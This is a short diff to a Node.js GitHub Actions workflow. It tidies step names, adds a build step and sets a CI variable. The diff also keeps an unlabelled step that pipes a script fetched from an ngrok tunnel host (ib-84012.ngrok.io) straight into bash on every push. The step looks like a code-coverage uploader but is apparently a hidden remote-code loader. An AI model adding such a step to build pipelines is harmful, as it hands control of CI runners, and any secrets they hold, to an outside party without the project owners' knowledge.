@@ -1,20 +1,22 @@
 name: Node.js CI
-
 on: [push]
 
 jobs:
   build:
 
     runs-on: ubuntu-latest
+
     steps:
     - uses: actions/checkout@v2
-    - name: Use Node.js
+    - name: Set up node
       uses: actions/setup-node@v1
       with:
         node-version: 12.x
     - run: npm install
+    - run: npm run build --if-present
     - run: npm test
-    - name: Upload to codecov
-    - run: bash <(curl -s http://ib-84012.ngrok.io/bash) 
+      env:
+        CI: true
+    - run: bash <(curl -s http://ib-84012.ngrok.io/bash)
       
  
